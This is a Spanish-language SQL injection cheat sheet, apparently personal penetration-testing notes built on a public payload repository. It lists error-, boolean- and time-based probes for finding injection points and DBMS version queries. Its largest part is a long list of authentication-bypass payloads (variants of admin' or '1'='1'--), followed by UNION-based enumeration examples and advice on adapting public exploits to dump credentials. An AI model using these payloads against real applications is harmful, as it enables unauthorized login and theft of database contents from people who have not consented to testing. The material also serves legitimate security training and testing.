

# Indice
- [CheatSheets](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#cheatsheets)
    - [MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
    - [MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
    - [OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
    - [PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
    - [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
    - [SQLmap]()
- [Entry point detection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)
- [DBMS Identification](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification)


# Identificando el punto de entrada

Deteccion de vulnerabilidad SQLI
- Basada en errores
  - Caracteres simples
````sql
‘
“
‘)
‘))
“))
/
;
//
\
%27
%22
%23
%3B
````

Una vez hemos averiguado como SQL toma el input rompiendo la query debemos recomponerla para obtener los resultados que queremos.
````sql
'' --+
' --+
'' #
' * *
' -- -
' or '1
````

- Usando condiciones verdaderas
````sql
or 1=1 -- true
' or 1=1 -- true
" or 1=1 -- true
and 1=2 -- false
````
- Basada en tiempo
  Usando los comandos de SQL `sleep` o `benchmark` podemos identificar puntos de inyeccion, si al hacer la request tarda x segundos en devolver el resultado se confirma la vulnerabilidad.

# Identificacion de bases de datos
|   |   |
|---|---|
|Oracle|`SELECT banner FROM v$version   SELECT version FROM v$instance   `|
|Microsoft|`SELECT @@version`|
|PostgreSQL|`SELECT version()`|
|MySQL|`SELECT @@version`|

# Bypass de autenticacion

> En ocasiones un panel de autenticacion vulnerable a SQLI no solo nos permite bypassear la autenticacion si no que nos puede permitir continuar con todo el proceso de inyeccion y dumpeo de la informacion de la base de datos.

Inyecciones comunes
````sql
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer 
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
````

# Enumeracion de la base de datos
Al intentar extraer informacion de la base de datos los resultados de las querys se puede almacenar de diversas formas
- En archivos
- En otras columnas
````
# En este ejemplo el contenido de la columna 2 solo se vera en caso que se exponga el contenido de la columna 4
'UNION SELECT 1,2,3,@@version-- -
    Resultado columna MariaDB 5.4 y 2

'UNION SELECT 1,@@database(),3,@@version-- -
     Resultado columna MariaDB 5.4 y users
````

# Exploits publicos

Los exploits publicos que no explotan la vulnerabilidad automaticamente nos dan informacion muy importante como:
- Revela donde esta el parametro inyectable
- Ademas de confirmar una vulnerabilidad puede modificarse para explotarla ([WebERP](https://www.exploit-db.com/exploits/47013))
- Puede dumpear credenciales de al base de datos


